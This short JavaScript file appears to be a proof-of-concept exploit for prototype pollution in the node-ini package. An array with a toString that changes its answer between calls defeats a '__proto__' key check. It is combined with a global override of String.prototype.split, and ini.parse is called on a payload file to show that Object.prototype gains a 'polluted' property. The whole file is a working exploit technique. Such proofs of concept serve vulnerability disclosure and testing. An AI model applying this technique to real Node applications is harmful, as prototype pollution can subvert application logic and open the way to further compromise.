var arg = ['__proto__'];
var flag1 = true;
arg.toString = function () {
    if (flag1) {
        flag1 = false;
        return 'foo';
    } else {
        return '__proto__';
    }
};
String.prototype.split = function () {
    return [
        arg,
        'polluted'
    ];
};
const ini = require('node-ini');
console.log({}.polluted);
ini.parse('./payload.ini', function (err, data) {
    console.log({}.polluted);
});